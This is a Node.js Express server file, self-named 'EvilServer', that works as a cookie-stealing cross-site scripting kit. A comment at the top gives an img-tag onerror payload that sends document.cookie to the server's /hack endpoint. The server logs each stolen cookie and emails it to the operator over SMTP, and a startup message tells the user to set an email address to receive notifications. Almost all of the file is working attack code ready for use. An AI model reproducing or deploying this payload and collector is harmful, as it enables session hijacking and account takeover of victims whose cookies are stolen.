// Payload : <img src="invalid-url" onerror="this.src='http://localhost:5001/hack?cookie='+document.cookie; this.removeAttribute('onerror');"></img> 

// For backend and express
require('dotenv').config();
const express = require('express');
const cors = require("cors");
const nodeMailer = require('nodemailer');



const port = 5001;
const app = express();
console.log("EvilServer listen at port "+port);
console.log("Make sure to edit the EMAIL_TO in .env file with your email to recive notification");
app.use(express.json());
app.use(cors());

app.get("/hack", async (req, resp) => {
    try {
        resp.send(null);
        console.log("Payload triggered\nResponse: " + req.query.cookie);
        sendEmail(req.query.cookie);
    } catch (e) {
        console.log(e);
        resp.send("Something Went Wrong");
    }
});

const sendEmail = async (content) => {
    
    try {
        const trasnporer = nodeMailer.createTransport({
            host: "smtp-mail.outlook.com",
            port: 587,
            secure: false,
            auth: {
                user: process.env.EMAIL_FROM,
                pass: process.env.EMAIL_PASSWORD
            },
       });
       
       const info = await trasnporer.sendMail({
           from: process.env.EMAIL_FROM,
           to: process.env.EMAIL_TO,
           subject: "EvilServer",
           text: content,
       });
    
    
       console.log("Message sent: " + info);
    } catch (error) {
        console.log(error.message);
    }
   
    
};
   

app.listen(port);